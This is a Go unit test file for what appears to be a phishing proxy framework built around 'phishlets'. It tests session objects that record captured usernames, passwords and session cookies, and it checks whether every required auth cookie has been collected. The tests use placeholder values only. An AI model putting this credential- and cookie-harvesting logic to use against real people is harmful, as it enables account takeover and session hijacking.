package core

import (
	"testing"
	"time"
)

func TestSession_Creation(t *testing.T) {
	phishlet := "test_phish"

	s, err := NewSession(phishlet)
	if err != nil {
		t.Fatalf("NewSession failed: %v", err)
	}

	if s.Id == "" {
		t.Errorf("Expected auto-generated ID")
	}
	if s.Name != phishlet {
		t.Errorf("Expected Name %s, got %s", phishlet, s.Name)
	}

	// Set props
	s.SetUsername("admin")
	if s.Username != "admin" {
		t.Errorf("Username mismatch")
	}

	s.SetPassword("pass")
	if s.Password != "pass" {
		t.Errorf("Password mismatch")
	}

	// Custom
	s.SetCustom("foo", "bar")
	if s.Custom["foo"] != "bar" {
		t.Errorf("Custom field not set")
	}
}

func TestSession_CookieAuth(t *testing.T) {
	s, _ := NewSession("test")
	dom := "example.com"
	key := "sessionid"
	val := "12345"

	s.AddCookieAuthToken(dom, key, val, "/", true, true, time.Now())

	if len(s.CookieTokens[dom]) != 1 {
		t.Errorf("Expected 1 cookie token")
	}

	tk := s.CookieTokens[dom][key]
	if tk.Value != val {
		t.Errorf("Value mismatch")
	}

	// Test update existing
	s.AddCookieAuthToken(dom, key, "67890", "/", true, true, time.Now())
	if s.CookieTokens[dom][key].Value != "67890" {
		t.Errorf("Update failed")
	}
}

func TestSession_Capture(t *testing.T) {
	s, _ := NewSession("test")
	// Setup captured tokens
	s.AddCookieAuthToken("example.com", "sid", "123", "/", true, true, time.Now())

	// Define required tokens (from Phishlet config structure usually)
	// Mocking Phishlet's cookieAuthTokens
	required := make(map[string][]*CookieAuthToken)
	required["example.com"] = []*CookieAuthToken{
		{
			domain: "example.com",
			name:   "sid",
			always: true,
		},
	}

	if !s.AllCookieAuthTokensCaptured(required) {
		t.Errorf("Should be captured")
	}

	// Add requirement
	required["example.com"] = append(required["example.com"], &CookieAuthToken{
		domain: "example.com",
		name:   "missing",
	})

	if s.AllCookieAuthTokensCaptured(required) {
		t.Errorf("Should NOT be captured due to missing token")
	}
}
